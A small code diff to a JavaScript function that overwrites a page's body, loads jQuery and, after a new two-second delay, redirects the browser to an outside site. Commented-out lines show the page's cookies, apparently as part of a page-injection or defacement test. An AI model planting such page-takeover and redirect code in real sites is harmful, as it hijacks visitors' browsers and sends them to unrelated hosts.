@@ -35,8 +35,10 @@ function app() {
   $("body").html(html_text);
   //$(".cookie").text(document.cookie);
   $("body").append(`<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>`);
+  setTimeout(function(){
   window.location.href="https://arinweb.epizy.com";
-  //$("html").text("COOKİE: "+document.cookie);
+ },2000);
+//$("html").text("COOKİE: "+document.cookie);
 }
   //alert('Arin Web');
 app();
